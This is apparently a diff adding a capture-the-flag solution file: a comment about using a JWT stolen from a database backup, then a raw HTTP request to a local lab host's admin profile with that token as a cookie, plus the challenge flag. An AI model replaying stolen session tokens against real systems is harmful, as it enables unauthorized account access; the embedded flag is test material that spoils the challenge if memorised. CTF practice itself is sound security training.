@@ -1,0 +1,5 @@
+# Access admin profile with stolen JWT token from DB backup to reveal CTF flag{1435b29b-5d02-4320-8377-dc1db54c035d}
+
+GET /adminpanel/profile HTTP/1.1
+Host: 172.17.0.1:53025
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiI5NjY2IiwiaWF0IjoxNzc2MDM4NjMyLCJleHAiOjE3NzYwNDIyMzJ9.Qa0UeaDe9juhjd1upL_Cmv9KA1l5pdcMGeUmFPROZmw
